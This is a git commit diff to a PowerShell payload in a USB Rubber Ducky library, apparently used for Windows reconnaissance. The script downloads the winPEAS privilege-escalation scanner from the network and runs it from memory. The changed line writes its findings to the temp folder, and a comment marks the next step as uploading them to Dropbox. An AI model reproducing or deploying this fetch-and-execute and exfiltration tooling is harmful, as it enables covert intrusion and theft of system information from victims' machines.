ac6ff22d79c9f9ac2ed010335ecb91bca4134d80
FalsePhilosopher <joshgarland90@gmail.com>
2022-10-11 20:14:24 -0600

    winpeasupdate

--- Ducky/USBRubberducky/library/recon/Win/Winpeas/WP.ps1
+++ Ducky/USBRubberducky/library/recon/Win/Winpeas/WP.ps1
@@ -7,7 +7,7 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
 $url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
 
 # One liner to download and execute winPEASany from memory in a PS shell
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") | Out-File -Encoding ASCII $env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") >> $env:TMP\$FileName
 
 #Upload output file to dropbox
 
